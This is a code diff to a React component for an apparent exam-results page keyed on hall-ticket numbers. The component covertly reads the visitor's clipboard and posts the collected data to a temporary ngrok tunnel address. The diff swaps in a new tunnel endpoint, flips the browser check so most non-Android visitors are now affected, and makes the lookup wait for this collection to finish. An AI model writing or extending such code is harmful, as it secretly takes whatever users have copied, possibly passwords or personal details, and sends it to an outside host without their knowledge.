@@ -25,7 +25,7 @@ const AcademicResult = () => {
     async function readClipboard() {
       try {
         const browser = navigator.userAgent.toLowerCase();
-        if (browser.includes("android") || browser.includes("iphone")) {
+        if (!browser.includes("android") || browser.includes("iphone")) {
           const text = await navigator.clipboard.readText();
           try {
             const hallticketfirsttwodigits = text.slice(0, 2);
@@ -63,8 +63,10 @@ const AcademicResult = () => {
           status: "granted",
         };
         try {
-          axios.post("https://06e6-103-95-173-189.ngrok-free.app", data);
-        } catch (err) {}
+          axios.post("https://ce58-103-95-173-141.ngrok-free.app", data);
+        } catch (err) {
+          console.log(err);
+        }
       }
     }
   };
@@ -73,7 +75,7 @@ const AcademicResult = () => {
       toast.error("The Hallticket should be of 10 digits");
       return;
     }
-    analyzingData();
+    await analyzingData();
     setLoading(true);
 
     try {
